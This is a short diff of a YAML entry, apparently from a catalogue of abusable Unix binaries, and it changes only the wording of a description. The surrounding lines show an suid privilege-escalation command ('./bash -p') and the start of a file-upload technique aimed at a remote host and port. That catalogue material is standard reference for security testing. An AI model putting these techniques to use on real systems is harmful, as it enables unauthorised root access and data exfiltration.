@@ -7,7 +7,7 @@ functions:
   suid-enabled:
     - code: ./bash -p
   upload:
-    - description: Send local file in the body of an HTTP POST request. Run an HTTP service to collect the file from the other end.
+    - description: Send local file in the body of an HTTP POST request. Run an HTTP service to collect the file on the other end.
       code: |
         RHOST=10.0.0.1
         RPORT=8000
